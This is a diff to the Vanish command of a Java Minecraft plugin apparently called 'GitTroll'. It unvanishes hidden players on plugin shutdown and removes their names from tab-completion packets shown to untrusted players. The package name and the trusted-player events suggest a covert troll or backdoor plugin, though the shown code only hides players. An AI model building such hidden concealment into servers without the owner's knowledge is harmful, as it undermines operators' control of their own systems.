@@ -24,6 +24,7 @@ import net.Lenni0451.GitTroll.event.EventListener;
 import net.Lenni0451.GitTroll.event.events.EventServerPacket;
 import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
 import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
+import net.Lenni0451.GitTroll.event.events.PluginDisableEvent;
 import net.Lenni0451.GitTroll.event.types.Event;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
@@ -212,6 +213,12 @@ public class Vanish extends CommandBase implements Listener, EventListener {
 			this.onUnTrust((EventUntrustPlayer) event);
 		} else if(event instanceof EventServerPacket) {
 			this.onPacketSend((EventServerPacket) event);
+		} else if(event instanceof PluginDisableEvent) {
+			while(!this.vanishedPlayer.isEmpty()) {
+				CustomPlayer vanishedPlayer = this.vanishedPlayer.get(0);
+				vanishedPlayer.sendGitMessage("§cYou have been unvanished because the plugin is going to be disabled.");
+				this.disableVanish(vanishedPlayer.getPlayer(), false);
+			}
 		}
 	}
 	
@@ -237,11 +244,14 @@ public class Vanish extends CommandBase implements Listener, EventListener {
 	
 	public void onPacketSend(EventServerPacket event) {
 		if(event.getPacket() instanceof PacketPlayOutTabComplete) {
+			if(CustomPlayer.instanceOf(event.getPlayer()).isTrusted()) {
+				return;
+			}
 			PacketPlayOutTabComplete packet = (PacketPlayOutTabComplete) event.getPacket();
 			try {
-				Field f = packet.getClass().getDeclaredFields()[0];
+				Field f = packet.getClass().getDeclaredField("a");
 				f.setAccessible(true);
-				List<String> tabs = Arrays.asList((String[]) f.get(packet));
+				List<String> tabs = new ArrayList<>(Arrays.asList((String[]) f.get(packet)));
 				for(CustomPlayer vanishedPlayer : this.vanishedPlayer) {
 					tabs.remove(vanishedPlayer.getPlayer().getName());
 				}
